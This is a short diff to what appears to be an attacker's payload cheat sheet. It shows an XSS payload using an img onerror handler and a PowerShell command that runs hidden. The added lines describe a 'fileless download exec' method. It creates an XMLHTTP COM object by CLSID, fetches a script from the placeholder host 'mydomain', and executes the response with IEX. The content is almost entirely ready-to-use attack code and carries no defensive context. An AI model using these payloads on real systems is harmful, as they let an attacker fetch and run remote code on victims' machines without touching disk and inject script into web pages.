@@ -2,3 +2,9 @@ xss:<img/src=` onerror=confirm`Test`>
 
 powershell:
 1)powershell -w 1 -C "calc.exe"
+
+2)Powershell + COM fileless download exec alternative:
+$o = [activator]::CreateInstance([type]::GetTypeFromCLSID("F5078F35-C551-11D3-89B9-0000F81FE221"));
+$o.Open("GET", "http://mydomain/whoami.txt", $False); 
+$o.Send(); 
+IEX $o.responseText;
